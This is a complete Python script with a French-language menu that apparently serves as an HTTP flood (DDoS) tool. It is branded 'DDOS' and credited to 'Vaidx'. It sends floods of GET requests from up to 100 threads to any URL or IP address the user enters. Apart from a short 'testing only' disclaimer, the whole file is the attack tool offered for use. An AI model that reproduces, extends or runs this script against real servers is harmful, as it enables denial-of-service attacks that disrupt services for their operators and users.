import requests
import time
import re
from colorama import Fore, Style, init
import os
import signal
import threading
from queue import Queue

# Initialiser colorama
init(autoreset=True)

# Fonction pour valider l'URL entrée (modifiée pour accepter les IP locales et les ports)
def is_valid_url(url):
    pattern = re.compile(r'^(http://|https://)?(([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,6}|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)(:\d+)?(/.*)?$')
    return re.match(pattern, url) is not None

# Fonction pour nettoyer la console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Affichage du message d'avertissement
def disclaimer():
    clear_console()
    print(Fore.RED + "============================ Avertissement ==========================")
    print(Fore.YELLOW + "Ce programme est destiné à des fins de test uniquement.")
    print(Fore.YELLOW + "L'utilisation abusive peut avoir des conséquences légales et éthiques.")
    print(Fore.YELLOW + "Veuillez utiliser ce programme de manière responsable.")
    print(Fore.RED + "=====================================================================")
    time.sleep(5)

# Menu principal
def main_menu(target_set, rps_set, threads_set):
    clear_console()
    print(Fore.BLUE + """ 
DDDDD   DDDDD    OOOOO   SSSSS | 
DD  DD  DD  DD  OO   OO SS     | 
DD   DD DD   DD OO   OO  SSSSS | Script Made By Vaidx
DD   DD DD   DD OO   OO      SS| 
DDDDDD  DDDDDD   OOOO0   SSSSS | """)
    print(Fore.CYAN + "\n====================Menu Principal===================")
    print(Fore.CYAN + f"1. Entrer l'URL ou l'adresse IP du serveur {'(' + Fore.GREEN + 'SET' + Fore.CYAN + ')' if target_set else ''}")
    print(Fore.CYAN + f"2. Entrer le nombre de requêtes à envoyer par seconde {'(' + Fore.GREEN + 'SET' + Fore.CYAN + ')' if rps_set else ''}")
    print(Fore.CYAN + f"3. Entrer le nombre de threads (min 1, max 100) {'(' + Fore.GREEN + 'SET' + Fore.CYAN + ')' if threads_set else ''}")
    print(Fore.CYAN + "4. Démarrer l'envoi des requêtes")
    print(Fore.CYAN + "5. Quitter")

def get_target():
    while True:
        target = input(Fore.CYAN + "\nEntrez l'URL ou l'adresse IP du serveur (ex : http://localhost:8080) : ")
        if not target.startswith('http://') and not target.startswith('https://'):
            target = 'http://' + target  # Ajouter http:// si non spécifié
        if is_valid_url(target):
            return target
        else:
            print(Fore.RED + "\nL'URL saisie est invalide, veuillez réessayer.")

def get_rps():
    while True:
        try:
            rps = int(input(Fore.CYAN + "Entrez le nombre de requêtes à envoyer par seconde (par exemple 500) : "))
            if rps > 0:
                return rps
            else:
                print(Fore.RED + "Veuillez entrer un nombre positif.")
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre entier valide.")

def get_threads():
    while True:
        try:
            threads = int(input(Fore.CYAN + "Entrez le nombre de threads (min 1, max 100) : "))
            if 1 <= threads <= 100:
                return threads
            else:
                print(Fore.RED + "Veuillez entrer une valeur entre 1 et 100.")
        except ValueError:
            print(Fore.RED + "Veuillez entrer un nombre entier valide.")

# Fonction pour envoyer les requêtes de manière optimisée avec des threads
def worker(queue, url, results):
    while not queue.empty():
        try:
            requests.get(url)
            results["sent"] += 1
        except Exception as e:
            results["errors"] += 1

def send_requests(url, rps, threads):
    print(Fore.GREEN + f"\nDébut de l'envoi des requêtes vers {url} à raison de {rps} requêtes par seconde avec {threads} threads.")
    queue = Queue()
    results = {"sent": 0, "errors": 0}
    total_requests = rps * threads
    
    # Ajouter les requêtes dans la queue
    for _ in range(total_requests):
        queue.put(1)

    # Lancer les threads
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(queue, url, results))
        threads_list.append(t)
        t.start()

    # Attendre la fin des threads
    for t in threads_list:
        t.join()

    print(Fore.GREEN + f"\nEnvoi terminé : {results['sent']} requêtes réussies, {results['errors']} erreurs.")
    time.sleep(5)

def confirm_exit():
    print(Fore.YELLOW + f"\n\nVoulez-vous vraiment quitter ? (O/N)")
    choice = input().strip().lower()
    if choice == 'o':
        print(Fore.RED + "Fermeture du programme dans 5 secondes...")
        time.sleep(5)
        exit()
    else:
        print(Fore.GREEN + "Reprise du programme...")

# Programme principal
if __name__ == "__main__":
    disclaimer()
    target = None
    rps = None
    threads = None
    target_set = False
    rps_set = False
    threads_set = False

    while True:
        main_menu(target_set, rps_set, threads_set)
        choice = input(Fore.CYAN + "\nChoisissez une option (1-5) : ")
        
        if choice == '1':
            target = get_target()
            target_set = True
            print(Fore.GREEN + "L'URL ou l'adresse IP a été configurée avec succès!")
            time.sleep(1)
        elif choice == '2':
            rps = get_rps()
            rps_set = True
            print(Fore.GREEN + "Le nombre de requêtes par seconde a été configuré avec succès!")
            time.sleep(1)
        elif choice == '3':
            threads = get_threads()
            threads_set = True
            print(Fore.GREEN + "Le nombre de threads a été configuré avec succès!")
            time.sleep(1)
        elif choice == '4':
            if target and rps and threads:
                send_requests(target, rps, threads)
            else:
                print(Fore.RED + "Veuillez d'abord entrer l'URL, le nombre de requêtes par seconde et le nombre de threads.")
                time.sleep(1.5)
        elif choice == '5':
            confirm_exit()
        else:
            print(Fore.RED + "Option invalide, veuillez réessayer.")
            time.sleep(1)
